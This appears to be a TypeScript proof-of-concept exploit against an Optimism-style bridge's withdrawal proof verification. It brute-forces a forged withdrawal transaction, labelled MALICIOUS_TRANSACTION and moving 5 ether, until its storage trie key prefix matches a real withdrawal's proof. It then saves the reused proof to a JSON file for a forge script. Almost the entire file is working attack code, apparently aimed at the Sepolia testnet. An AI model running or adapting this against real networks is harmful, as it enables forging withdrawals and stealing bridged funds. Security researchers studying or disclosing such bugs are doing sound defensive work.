import { BigNumber, ethers } from 'ethers'
import { rlp,  keccak256, bufferToHex } from 'ethereumjs-util';
import { hashWithdrawal } from '@eth-optimism/core-utils/'
import * as fs from 'fs';
import * as path from 'path';


interface OutputProposal {
  outputRoot: string;
  timestamp: ethers.BigNumber;
  l2BlockNumber: ethers.BigNumber;
}

const l2OutputOracle_abi = [
  {
      "constant": true,
      "inputs": [
          {
              "name": "_l2OutputIndex",
              "type": "uint256"
          }
      ],
      "name": "getL2Output",
      "outputs": [
          {
              "components": [
                  {"name": "outputRoot", "type": "bytes32"},
                  {"name": "timestamp", "type": "uint128"},
                  {"name": "l2BlockNumber", "type": "uint128"}
              ],
              "name": "",
              "type": "tuple"
          }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "constant": true,
      "inputs": [],
      "name": "latestOutputIndex",
      "outputs": [
          {
              "name": "",
              "type": "uint256"
          }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
  }
];

// Finds the slot for sentMessages[hash] in the L2toL1MessagePasser
function calculateMappingSlot(key: string): string {
  const slotHex = ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32);
  const data = key + slotHex.slice(2);
  return ethers.utils.keccak256(data);
}

// Given a storage slot, computes the key used in the trie lookup (i.e. the keccak256 of the slot)
function hashSlotHex(slotHex) {
  const formattedHex = slotHex.startsWith('0x') ? slotHex.slice(2) : slotHex;
  const paddedHex = formattedHex.padStart(64, '0');
  const slotBuffer = Buffer.from(paddedHex, 'hex');
  return bufferToHex(keccak256(slotBuffer));
}

// Calls `eth_getProof` to get the storage proof for a specific storage slot
async function getStorageProof(contractAddress: string, storageKey: string, l2BlockNumber: string): Promise<any> {
  const keyHex = ethers.utils.hexZeroPad(ethers.utils.hexlify(storageKey), 32);
  return await L2_PROVIDER.send('eth_getProof', [contractAddress, [keyHex], l2BlockNumber]);
}

// Helper function for decoding RLP
function decodeCompact(encoded: Buffer): string {
  if (encoded.length === 0) return '';
  let nibbles = '';
  for (let i = 0; i < encoded.length; i++) {
      nibbles += encoded[i].toString(16).padStart(2, '0');
  }
  // Remove the even/odd flag
  let firstByte = parseInt(nibbles.substring(0, 2), 16);
  let offset = firstByte % 2 === 0 ? 2 : 1;
  firstByte -= offset;
  nibbles = firstByte.toString(16).padStart(2, '0') + nibbles.substring(2);
  // Convert back to nibbles, correctly handling the first byte
  return nibbles.substring(offset * 2);
}


// Get info about the structure of the trie proof (e.g. the sequence of branch, extension, leaf nodes)
function getProofNodeInfo(encodedNode: string): string {
  const formattedNode = encodedNode.startsWith('0x') ? encodedNode.slice(2) : encodedNode;
  const nodeBuffer = Buffer.from(formattedNode, 'hex');
  const node = rlp.decode(nodeBuffer) as unknown as Buffer[];
  if (Array.isArray(node) && node.length === 17) {
      return 'branch';
  } else if (Array.isArray(node) && node.length === 2) {
      const path = decodeCompact(node[0]);
      const isLeaf = (node[0][0] & 0x20) !== 0;
      return isLeaf ? `leaf [path=${path}] [value=${node[1].toString('hex')}]` : `extension [path=${path}]`;
  }
  return 'unknown';
}


async function fetchRecentWithdrawalEvents(): Promise<any> {
  const abi = [
    "event MessagePassed(uint256 indexed nonce, address indexed sender, address indexed target, uint256 value, uint256 gasLimit, bytes data, bytes32 withdrawalHash)"
  ];
  const contract = new ethers.Contract(L2_TO_L1_MESSAGE_PASSER_ADDRESS, abi, L2_PROVIDER);
  const toBlock = await L2_PROVIDER.getBlockNumber();
  const fromBlock = toBlock - 1_000_000;

  const eventFilter = contract.filters.MessagePassed();

  const events = await contract.queryFilter(eventFilter, fromBlock, toBlock);

  const eventData = events.map(event => ({
    nonce: event.args.nonce,
    sender: event.args.sender,
    target: event.args.target,
    value: event.args.value,
    gasLimit: event.args.gasLimit,
    data: event.args.data,
    withdrawalHash: event.args.withdrawalHash
  }));

  return eventData;
}

async function getProofInfo(l2BlockNumber: string, input_hash: string) {
  const calculatedSlot = calculateMappingSlot(input_hash);
  const fullProof = await getStorageProof(L2_TO_L1_MESSAGE_PASSER_ADDRESS, calculatedSlot, l2BlockNumber);
  const proof = fullProof.storageProof[0].proof;
  const nodeTypes = proof.map(getProofNodeInfo);
  return {proof, nodeTypes};
}

// Iterate through different gasLimit and data values until the tx has a trie key prefix
// that matches the neededPrefix argument
async function findMatchingHash(neededPrefix: string) {
  const tx = {
      ...MALICIOUS_TRANSACTION,
      nonce: BigNumber.from('0x01000000000000000000000000000000000000000000000000000000004073'),
      // Note: adding a random number btw 0-1000 here makes this script return different withdrawal hashes each time
      gasLimit: BigNumber.from('300000').add(Math.floor(Math.random() * 1001)),
      data: '0x0000'
  };

  let dataCounter = 0;
  for (let i = 0; i < 5_000_000; i++) {
      let hexData = dataCounter.toString(16).padStart(4, '0');
      tx.data = '0x' + hexData;

      const calculatedHash = hashWithdrawal(
          tx.nonce,
          tx.sender,
          tx.target,
          tx.value,
          tx.gasLimit,
          tx.data
      );
      const key = hashSlotHex(calculateMappingSlot(calculatedHash));

      if (key.slice(0, neededPrefix.length) === neededPrefix) {
          return tx;
      }

      dataCounter++;
      if (dataCounter > 0xFFFF) {
          dataCounter = 0;
          tx.gasLimit = BigNumber.from(tx.gasLimit.add(1));
      }
  }
}


async function getforgedTx(l2BlockNumber: string) {
  // Find recent REAL withdrawals
  const allWithdrawalEvents = await fetchRecentWithdrawalEvents();

  // limit to 100, in case there are a lot
  const withdrawalEvents = allWithdrawalEvents.slice(0, 100);

  console.log(`Searching through ${withdrawalEvents.length} recent real withdrawals for real proofs to leverage`)

  // Find the one with the shortest prefix that we'll need to match
  var bestRealProofLen = 1_000_000;
  var bestRealProofIdx;
  for (var i = 0; i < withdrawalEvents.length; ++i) {
    const { nodeTypes } = await getProofInfo(l2BlockNumber, withdrawalEvents[i].withdrawalHash);

    // We need the proof to end on a leaf node, and there can't be any extension nodes
    let lastElementIsALeaf = nodeTypes[nodeTypes.length - 1].includes("leaf");
    let containsExtensionNode = nodeTypes.some(item => item.includes("extension"));
    if (!lastElementIsALeaf || containsExtensionNode) continue;

    if (bestRealProofLen > nodeTypes.length) {
      bestRealProofLen = nodeTypes.length;
      bestRealProofIdx = i;
    }
  }

  // Now iterate through forged txs until one matches the prefix of the shortest
  // REAL withdrawal hash proof we just found
  const realTx = withdrawalEvents[bestRealProofIdx];
  const { proof, nodeTypes } = await getProofInfo(l2BlockNumber, realTx.withdrawalHash);

  const key = hashSlotHex(calculateMappingSlot(realTx.withdrawalHash));
  const neededPrefix = key.slice(0, nodeTypes.length + 3);

  console.log(`Found a good real withdrawal hash that has a short trie prefix before a leaf`);
  console.log(`Real withdrawalHash: ${realTx.withdrawalHash}`);
  console.log(`Real trie key: ${key}`);
  console.log(`Prefix of trie key before leaf: ${neededPrefix}`);
  console.log(`Exact trie path: ${nodeTypes}`);
  console.log(`Now iterating to find a tx with a matching trie prefix...`);
  const forgedTx = await findMatchingHash(neededPrefix);

  const forgedWithdrawalHash = hashWithdrawal(
    forgedTx.nonce,
    forgedTx.sender,
    forgedTx.target,
    forgedTx.value,
    forgedTx.gasLimit,
    forgedTx.data
  );
  const forgedKey = hashSlotHex(calculateMappingSlot(forgedWithdrawalHash));

  console.log(`Found a matching prefix!`);
  console.log(`Forged withdrawalHash: ${forgedWithdrawalHash}`);
  console.log(`Forged trie key: ${forgedKey}`);
  return { proof, forgedTx };
}

/**********************************************************************

***********************************************************************/

async function main() {

  // Get necessary info about the most recent L2OutputOracle data
  const l2OutputOracle = new ethers.Contract(L2_OUTPUT_ORACLE_ADDRESS, l2OutputOracle_abi, SEPOLIA_PROVIDER);
  const l2OutputIndex = await l2OutputOracle.latestOutputIndex();
  const result: OutputProposal = await l2OutputOracle.getL2Output(l2OutputIndex);
  const l2BlockNumber = result.l2BlockNumber;
  let cleanedHexString = '0x' + parseInt(l2BlockNumber.toHexString(), 16).toString(16);
  const block = await L2_PROVIDER.send('eth_getBlockByNumber', [cleanedHexString, true]);
  console.log('Latest L2 outputIndex we will prove against:', l2OutputIndex.toNumber());

  // Find a real transaction and create a forged withdrawal from its proof
  const { proof, forgedTx } = await getforgedTx(block.number);


  // Store the information into a JSON for later use in a forge script
  const data = {
    proof: proof,
    nonce: forgedTx.nonce.toString(),
    sender: forgedTx.sender,
    target: forgedTx.target,
    value: forgedTx.value.toString(),
    gasLimit: forgedTx.gasLimit.toString(),
    data: forgedTx.data,
    l2OutputIndex: l2OutputIndex.toNumber(),
    version: "0x0000000000000000000000000000000000000000000000000000000000000000",
    stateRoot: block.stateRoot,
    storageHash: (await getStorageProof(L2_TO_L1_MESSAGE_PASSER_ADDRESS, '0x00', block.number)).storageHash,
    latestBlockhash: block.hash
  };

  const outputFilePath = path.resolve(__dirname, `./forgedWithdrawal.json`);
  fs.writeFileSync(outputFilePath, JSON.stringify(data, null, 2));
  console.log(`The forged transaction data has been written to ${outputFilePath}`);
}

/**********************************************************************

***********************************************************************/

const SEPOLIA_RPC_URL = process.env.SEPOLIA_RPC_URL;
if (!SEPOLIA_RPC_URL) throw new Error('SEPOLIA_RPC_URL env variable not set');
const SEPOLIA_PROVIDER = new ethers.providers.JsonRpcProvider(SEPOLIA_RPC_URL);

const L2_RPC_URL = process.env.L2_RPC_URL
if (!L2_RPC_URL) throw new Error('L2_RPC_URL env variable not set')
const L2_PROVIDER = new ethers.providers.JsonRpcProvider(L2_RPC_URL);

const L2_OUTPUT_ORACLE_ADDRESS = process.env.L2_OUTPUT_ORACLE_ADDRESS
if (!L2_OUTPUT_ORACLE_ADDRESS) throw new Error('L2_OUTPUT_ORACLE_ADDRESS env variable not set')

const L2_TO_L1_MESSAGE_PASSER_ADDRESS = "0x4200000000000000000000000000000000000016";

const MALICIOUS_TRANSACTION = {
  sender: '0x4200000000000000000000000000000000000007',
  target: '0x88d893d62f2A90Fd2C939040feab4E13A9C4F313',
  value: ethers.utils.parseUnits("5", "ether")
}

main();
